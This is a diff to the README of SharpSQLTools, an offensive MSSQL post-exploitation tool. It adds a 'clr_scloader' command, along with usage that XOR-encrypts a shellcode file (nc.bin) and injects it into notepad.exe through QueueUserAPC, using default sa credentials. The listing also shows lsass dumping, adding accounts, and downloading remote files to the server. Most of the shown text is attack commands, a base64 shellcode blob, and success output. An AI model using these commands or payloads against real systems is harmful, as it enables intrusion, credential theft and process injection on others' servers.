@@ -9,7 +9,7 @@
 ### Usage
 
 ```
->SharpSQLTools.exe
+λ SharpSQLTools.exe
 
    _____ _                      _____  ____  _   _______          _
   / ____| |                    / ____|/ __ \| | |__   __|        | |
@@ -43,6 +43,7 @@ uninstall_clr              - drop clr
 clr_dumplsass              - dumplsass by clr
 clr_adduser {user} {pass}  - add user by clr
 clr_download {url} {path}  - download file from url by clr
+clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
 exit                       - terminates the server process (and this session)
 
 ```
@@ -124,6 +125,26 @@ nt authority\system
 λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_download "http://192.168.28.185:8001/clac.bin" "c:\Users\Public\Downloads\test.bin"
 [*] Database connection is successful!
 [*] Download success
+```
+
+### clr_scloader
+```
+λ python Encrypt.py -f nc.bin -k 1234
+XorKey: 1234
+Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
+
+λ SharpSQLTools.exe 192.168.0.107 sa 1qaz@WSX clr_scloader zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfT F/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q== 1234
+[*] Database connection is successful!
+[+] EncryptShellcode: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
+[+] XorKey: 1234
+[+] StartProcess notepad.exe
+[+] OpenProcess Pid: 2508
+[+] VirtualAllocEx Success
+[+] QueueUserAPC Inject shellcode to PID: 2508 Success
+[+] hOpenProcessClose Success
+
+
+[*] QueueUserAPC Inject shellcode Success, enjoy!
 ```
 
 
